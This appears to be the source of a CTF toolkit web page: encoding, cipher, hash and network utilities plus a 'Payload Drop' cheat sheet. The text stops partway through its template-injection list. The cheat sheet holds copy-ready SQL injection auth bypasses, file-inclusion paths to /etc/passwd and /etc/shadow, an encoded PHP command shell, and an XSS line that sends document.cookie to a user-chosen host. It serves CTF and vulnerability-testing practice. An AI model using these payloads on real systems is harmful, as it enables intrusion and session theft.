---
import BaseLayout from '../layouts/BaseLayout.astro';
---

<BaseLayout 
  title="Toolkit" 
  description="Client-side utilities and payload drop for rapid CTF operations." 
  activePage="arsenal"
  extraCss={['/styles/arsenal.css']}
>
  <div class="hud-tab-wrapper">
    <div class="arsenal-hud-tabs">
      <button class="hud-tab active" data-view="local-tools-view">
        <span class="hud-indicator"></span> Local Tools
      </button>
      <button class="hud-tab" data-view="external-links-view">
        <span class="hud-indicator"></span> External Links
      </button>
    </div>
  </div>

  <!-- VIEW 1: Local Tools -->
  <div id="local-tools-view" class="hud-view active">
    <div class="arsenal-container">
    
    <!-- Sidebar Navigation -->
    <aside class="arsenal-sidebar">
      <div class="hud-diagnostics">
        <div class="hud-diag-row">
          <span>STATUS:</span>
          <span class="hud-diag-val"><span class="hud-pulse"></span>ONLINE</span>
        </div>
        <div class="hud-diag-row">
          <span>SECURE_LINK:</span>
          <span class="hud-diag-val">ACTIVE</span>
        </div>
        <div class="hud-diag-row">
          <span>SYS_DECRYPT:</span>
          <span class="hud-diag-val">READY</span>
        </div>
      </div>

      <div class="arsenal-sidebar-group">
        <div class="arsenal-sidebar-title">Cryptography</div>
        <nav class="arsenal-sidebar-nav">
          <button class="arsenal-nav-btn active" data-target="tool-decoder">Decoder Ring</button>
          <button class="arsenal-nav-btn" data-target="tool-rot">ROT Cipher</button>
          <button class="arsenal-nav-btn" data-target="tool-vigenere">Vigenère Cipher</button>

          <button class="arsenal-nav-btn" data-target="tool-xor">XOR Tool</button>
        </nav>
      </div>
      
      <div class="arsenal-sidebar-group">
        <div class="arsenal-sidebar-title">Hashing & Forensics</div>
        <nav class="arsenal-sidebar-nav">
          <button class="arsenal-nav-btn" data-target="tool-hashgen">Hash Generator</button>
          <button class="arsenal-nav-btn" data-target="tool-hashid">Hash Identifier</button>
          <button class="arsenal-nav-btn" data-target="tool-magic">Magic Bytes</button>
          <button class="arsenal-nav-btn" data-target="tool-time">Timestamp Conv</button>
        </nav>
      </div>

      <div class="arsenal-sidebar-group">
        <div class="arsenal-sidebar-title">Networking</div>
        <nav class="arsenal-sidebar-nav">
          <button class="arsenal-nav-btn" data-target="tool-ip">IP Converter</button>
          <button class="arsenal-nav-btn" data-target="tool-cidr">CIDR Calculator</button>
        </nav>
      </div>

      <div class="arsenal-sidebar-group">
        <div class="arsenal-sidebar-title">Offensive</div>
        <nav class="arsenal-sidebar-nav">
          <button class="arsenal-nav-btn" data-target="tool-payloads">Payload Drop</button>
        </nav>
      </div>
    </aside>

    <!-- Main Content Area -->
    <main class="arsenal-main">
      
      <!-- TOOL: Decoder Ring -->
      <section id="tool-decoder" class="arsenal-tool-panel active">
        <div class="tool-header">
          <h1 class="tool-title" data-scramble="DECODER RING">DECODER RING</h1>
          <p class="tool-desc">Base64, URL, and Hexadecimal conversion.</p>
        </div>
        <div class="tool-section fade-up">
          <div class="tool-grid-2">
            <div class="form-group">
              <label class="form-label">Input Data</label>
              <textarea id="decoder-in" class="form-textarea" placeholder="Paste data here..."></textarea>
            </div>
            <div class="form-group">
              <label class="form-label">Output Data</label>
              <div id="decoder-out" class="result-box empty">Result will appear here...<button class="copy-btn" onclick="copyResult('decoder-out')">Copy</button></div>
            </div>
          </div>
          <div class="button-group">
            <button class="btn btn-primary" onclick="decodeRun('b64enc')">B64 Encode</button>
            <button class="btn" onclick="decodeRun('b64dec')">B64 Decode</button>
            <button class="btn btn-primary" onclick="decodeRun('urlenc')">URL Encode</button>
            <button class="btn" onclick="decodeRun('urldec')">URL Decode</button>
            <button class="btn btn-primary" onclick="decodeRun('hexenc')">Hex Encode</button>
            <button class="btn" onclick="decodeRun('hexdec')">Hex Decode</button>
          </div>
        </div>
      </section>

      <!-- TOOL: ROT Cipher -->
      <section id="tool-rot" class="arsenal-tool-panel">
        <div class="tool-header">
          <h1 class="tool-title" data-scramble="ROT CIPHER">ROT CIPHER</h1>
          <p class="tool-desc">Shift characters by N positions (e.g. ROT13). Monoalphabetic substitution.</p>
        </div>
        <div class="tool-section fade-up">
          <div class="tool-grid-2">
            <div>
              <div class="form-group">
                <label class="form-label">Input Text</label>
                <textarea id="rot-in" class="form-textarea" placeholder="Veni, vidi, vici..."></textarea>
              </div>
              <div class="form-group">
                <label class="form-label">Shift Amount (1-25)</label>
                <input type="number" id="rot-shift" class="form-input" value="13" min="1" max="25" />
              </div>
            </div>
            <div class="form-group">
              <label class="form-label">Output</label>
              <div id="rot-out" class="result-box empty">Result will appear here...<button class="copy-btn" onclick="copyResult('rot-out')">Copy</button></div>
            </div>
          </div>
          <div class="button-group">
            <button class="btn btn-primary" onclick="rotRun('encode')">Encode</button>
            <button class="btn" onclick="rotRun('decode')">Decode</button>
            <button class="btn" onclick="rotRun('all')">Show All</button>
            <button class="btn" style="border: 1px solid var(--accent); color: var(--accent); background: transparent;" onclick="rotRun('auto')">Auto-Decode</button>
          </div>
        </div>
      </section>

      <!-- TOOL: Vigenère Cipher -->
      <section id="tool-vigenere" class="arsenal-tool-panel">
        <div class="tool-header">
          <h1 class="tool-title" data-scramble="VIGENÈRE CIPHER">VIGENÈRE CIPHER</h1>
          <p class="tool-desc">Polyalphabetic substitution cipher using a text key.</p>
        </div>
        <div class="tool-section fade-up">
          <div class="tool-grid-2">
            <div>
              <div class="form-group">
                <label class="form-label">Input Text</label>
                <textarea id="vigenere-in" class="form-textarea" placeholder="Text to encode or decode..."></textarea>
              </div>
              <div class="form-group">
                <label class="form-label">Key (Alphabetic)</label>
                <input type="text" id="vigenere-key" class="form-input" placeholder="e.g. SECRET" />
              </div>
            </div>
            <div class="form-group">
              <label class="form-label">Output</label>
              <div id="vigenere-out" class="result-box empty">Result will appear here...<button class="copy-btn" onclick="copyResult('vigenere-out')">Copy</button></div>
            </div>
          </div>
          <div class="button-group">
            <button class="btn btn-primary" onclick="vigenereRun('encode')">Encode</button>
            <button class="btn" onclick="vigenereRun('decode')">Decode</button>
            <button class="btn" style="border: 1px solid var(--accent); color: var(--accent); background: transparent;" onclick="vigenereRun('auto')">Auto-Decode (Crack)</button>
          </div>
        </div>
      </section>


      <!-- TOOL: XOR Tool -->
      <section id="tool-xor" class="arsenal-tool-panel">
        <div class="tool-header">
          <h1 class="tool-title" data-scramble="XOR TOOL">XOR TOOL</h1>
          <p class="tool-desc">Perform bitwise XOR. Auto-detects hex vs plaintext inputs.</p>
        </div>
        <div class="tool-section fade-up">
          <div class="tool-grid-2">
            <div>
              <div class="form-group">
                <label class="form-label">Input Data</label>
                <textarea id="xor-in" class="form-textarea" placeholder="Data to XOR (hex or text)..."></textarea>
              </div>
              <div class="form-group">
                <label class="form-label">Key</label>
                <input type="text" id="xor-key" class="form-input" placeholder="Key (hex or text)..." />
              </div>
            </div>
            <div>
              <div class="form-group">
                <label class="form-label">Output (Hex)</label>
                <div id="xor-out-hex" class="result-box empty">Hex output...<button class="copy-btn" onclick="copyResult('xor-out-hex')">Copy</button></div>
              </div>
              <div class="form-group">
                <label class="form-label">Output (ASCII)</label>
                <div id="xor-out-ascii" class="result-box empty">ASCII output...<button class="copy-btn" onclick="copyResult('xor-out-ascii')">Copy</button></div>
              </div>
            </div>
          </div>
          <div class="button-group">
            <button class="btn btn-primary" onclick="xorRun()">Execute XOR</button>
          </div>
        </div>
      </section>

      <!-- TOOL: Hash Generator -->
      <section id="tool-hashgen" class="arsenal-tool-panel">
        <div class="tool-header">
          <h1 class="tool-title" data-scramble="HASH GENERATOR">HASH GENERATOR</h1>
          <p class="tool-desc">Real-time MD5, SHA-1, SHA-256, and SHA-512 calculation.</p>
        </div>
        <div class="tool-section fade-up">
          <div class="tool-grid-2">
            <div class="form-group">
              <label class="form-label">Input String</label>
              <textarea id="hashgen-in" class="form-textarea" placeholder="Type to hash..." oninput="hashRun()"></textarea>
            </div>
            <div>
              <div class="form-group">
                <label class="form-label">MD5</label>
                <div id="hashgen-md5" class="result-box empty">...<button class="copy-btn" onclick="copyResult('hashgen-md5')">Copy</button></div>
              </div>
              <div class="form-group">
                <label class="form-label">SHA-1</label>
                <div id="hashgen-sha1" class="result-box empty">...<button class="copy-btn" onclick="copyResult('hashgen-sha1')">Copy</button></div>
              </div>
              <div class="form-group">
                <label class="form-label">SHA-256</label>
                <div id="hashgen-sha256" class="result-box empty">...<button class="copy-btn" onclick="copyResult('hashgen-sha256')">Copy</button></div>
              </div>
              <div class="form-group">
                <label class="form-label">SHA-512</label>
                <div id="hashgen-sha512" class="result-box empty">...<button class="copy-btn" onclick="copyResult('hashgen-sha512')">Copy</button></div>
              </div>
            </div>
          </div>
        </div>
      </section>

      <!-- TOOL: Hash Identifier -->
      <section id="tool-hashid" class="arsenal-tool-panel">
        <div class="tool-header">
          <h1 class="tool-title" data-scramble="HASH IDENTIFIER">HASH IDENTIFIER</h1>
          <p class="tool-desc">Analyze a hash structure to determine possible algorithm types.</p>
        </div>
        <div class="tool-section fade-up">
          <div class="tool-grid-2">
            <div class="form-group">
              <label class="form-label">Unknown Hash</label>
              <input type="text" id="hashid-in" class="form-input" placeholder="e.g. 5d41402abc4b2a76b9719d911017c592" oninput="hashIdRun()" />
            </div>
            <div class="form-group">
              <label class="form-label">Possible Matches</label>
              <div id="hashid-out" class="result-box empty">Awaiting input...</div>
            </div>
          </div>
        </div>
      </section>

      <!-- TOOL: Magic Bytes -->
      <section id="tool-magic" class="arsenal-tool-panel">
        <div class="tool-header">
          <h1 class="tool-title" data-scramble="MAGIC BYTES">MAGIC BYTES</h1>
          <p class="tool-desc">Identify file types from their hexadecimal signatures.</p>
        </div>
        <div class="tool-section fade-up">
          <div class="tool-grid-2">
            <div class="form-group">
              <label class="form-label">File Header (Hex)</label>
              <input type="text" id="magic-in" class="form-input" placeholder="e.g. 89 50 4E 47 or 89504E47" oninput="magicRun()" />
            </div>
            <div class="form-group">
              <label class="form-label">File Type</label>
              <div id="magic-out" class="result-box empty">Awaiting signature...</div>
            </div>
          </div>
        </div>
      </section>

      <!-- TOOL: Magic Bytes -->
      <!-- TOOL: Timestamp Converter -->
      <section id="tool-time" class="arsenal-tool-panel">
        <div class="tool-header">
          <h1 class="tool-title" data-scramble="TIMESTAMP CONV">TIMESTAMP CONV</h1>
          <p class="tool-desc">Convert between Unix Epoch and human-readable dates.</p>
        </div>
        <div class="tool-section fade-up">
          <div class="tool-grid-2">
            <div>
              <h3 class="tool-section-title">Unix to Date</h3>
              <div class="form-group">
                <input type="number" id="time-unix-in" class="form-input" placeholder="e.g. 1721748234" oninput="timeUnixRun()" />
              </div>
              <div class="form-group">
                <div id="time-unix-out" class="result-box empty">Output...</div>
              </div>
            </div>
            <div>
              <h3 class="tool-section-title">Date to Unix</h3>
              <div class="form-group">
                <input type="datetime-local" id="time-date-in" class="form-input" onchange="timeDateRun()" />
              </div>
              <div class="form-group">
                <div id="time-date-out" class="result-box empty">Output...</div>
              </div>
            </div>
          </div>
        </div>
      </section>

      <!-- TOOL: IP Converter -->
      <section id="tool-ip" class="arsenal-tool-panel">
        <div class="tool-header">
          <h1 class="tool-title" data-scramble="IP CONVERTER">IP CONVERTER</h1>
          <p class="tool-desc">Convert IPv4 addresses to alternate representations (useful for SSRF bypass).</p>
        </div>
        <div class="tool-section fade-up">
          <div class="tool-grid-2">
            <div class="form-group">
              <label class="form-label">IPv4 Address</label>
              <input type="text" id="ip-in" class="form-input" placeholder="e.g. 192.168.1.1" oninput="ipRun()" />
            </div>
            <div>
              <div class="form-group">
                <label class="form-label">Hexadecimal</label>
                <div id="ip-out-hex" class="result-box empty">...<button class="copy-btn" onclick="copyResult('ip-out-hex')">Copy</button></div>
              </div>
              <div class="form-group">
                <label class="form-label">Integer (Decimal)</label>
                <div id="ip-out-int" class="result-box empty">...<button class="copy-btn" onclick="copyResult('ip-out-int')">Copy</button></div>
              </div>
              <div class="form-group">
                <label class="form-label">Binary</label>
                <div id="ip-out-bin" class="result-box empty">...<button class="copy-btn" onclick="copyResult('ip-out-bin')">Copy</button></div>
              </div>
            </div>
          </div>
        </div>
      </section>

      <!-- TOOL: CIDR Calculator -->
      <section id="tool-cidr" class="arsenal-tool-panel">
        <div class="tool-header">
          <h1 class="tool-title" data-scramble="CIDR CALCULATOR">CIDR CALCULATOR</h1>
          <p class="tool-desc">Calculate network boundaries and usable host ranges.</p>
        </div>
        <div class="tool-section fade-up">
          <div class="tool-grid-2">
            <div class="form-group">
              <label class="form-label">IP Address / CIDR</label>
              <input type="text" id="cidr-in" class="form-input" placeholder="e.g. 192.168.1.5/24" oninput="cidrRun()" />
            </div>
            <div class="form-group">
              <label class="form-label">Calculated Boundaries</label>
              <div id="cidr-out" class="result-box empty">Results...</div>
            </div>
          </div>
        </div>
      </section>

      <!-- TOOL: Payload Drop -->
      <section id="tool-payloads" class="arsenal-tool-panel">
        <div class="tool-header">
          <h1 class="tool-title" data-scramble="PAYLOAD DROP">PAYLOAD DROP</h1>
          <p class="tool-desc">Quick-copy cheat sheet for vulnerability testing.</p>
        </div>
        
        <div class="payload-search-bar fade-up">
          <svg class="payload-search-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
          </svg>
          <input type="text" id="payload-search" class="payload-search-input" placeholder="Search payloads (e.g. 'SQLi', 'passwd')..." oninput="filterPayloads()" />
        </div>

        <div class="tool-section fade-up payload-category" data-category="SQL Injection">
          <h3 class="tool-section-title">SQL Injection (Auth Bypass)</h3>
          <div class="payload-list">
            <div class="payload-item"><code class="payload-code">' OR '1'='1</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">' OR '1'='1' --</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">admin'--</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">' OR 1=1--</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">" OR ""="</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
          </div>
          
          <h3 class="tool-section-title" style="margin-top: 1.5rem;">SQL Injection (Error Probes)</h3>
          <div class="payload-list">
            <div class="payload-item"><code class="payload-code">'</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">''</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">`</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">')</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">"))</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
          </div>

          <h3 class="tool-section-title" style="margin-top: 1.5rem;">SQL Injection (UNION & Time)</h3>
          <div class="payload-list">
            <div class="payload-item"><code class="payload-code">' ORDER BY 1--</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">' ORDER BY 2--</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">' UNION SELECT NULL--</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">' UNION SELECT NULL,NULL--</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">' AND SLEEP(5)--</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">'; WAITFOR DELAY '0:0:5'--</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">' AND 1=IF(1=1,SLEEP(5),0)--</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
          </div>
        </div>

        <div class="tool-section fade-up payload-category" data-category="Local File Inclusion (LFI)">
          <h3 class="tool-section-title">Local File Inclusion (LFI)</h3>
          <div class="payload-list">
            <div class="payload-item"><code class="payload-code">../../../etc/passwd</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">....//....//....//etc/passwd</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">..%2F..%2F..%2Fetc%2Fpasswd</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">/etc/passwd</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">/etc/shadow</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">/proc/self/environ</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">/var/log/apache2/access.log</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">php://filter/convert.base64-encode/resource=index.php</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">php://input</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
          </div>
        </div>

        <div class="tool-section fade-up payload-category" data-category="Cross-Site Scripting (XSS)">
          <h3 class="tool-section-title">Cross-Site Scripting (XSS)</h3>
          <div class="payload-list">
            <div class="payload-item"><code class="payload-code">&lt;script&gt;alert(1)&lt;/script&gt;</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">&lt;img src=x onerror=alert(1)&gt;</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">&lt;img src=x onerror=alert`1`&gt;</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">javascript:alert(1)</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">&lt;svg onload=alert(1)&gt;</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item">
              <code class="payload-code" data-template="&lt;script&gt;fetch('$$0$$/?c='+document.cookie)&lt;/script&gt;">&lt;script&gt;fetch('<input type="text" class="payload-input-inline" placeholder="https://YOURURL" />/?c='+document.cookie)&lt;/script&gt;</code>
              <button class="payload-copy" onclick="copyTemplatePayload(this)">Copy</button>
            </div>
          </div>
        </div>

        <div class="tool-section fade-up payload-category" data-category="Server-Side Template Injection (SSTI)">
          <h3 class="tool-section-title">Server-Side Template Injection (SSTI)</h3>
          <div class="payload-list">
            <div class="payload-item"><code class="payload-code">{"{{7*7}}"}</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">${7*7}</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">&lt;%= 7*7 %&gt;</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
            <div class="payload-item"><code class="payload-code">#{7*7}</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
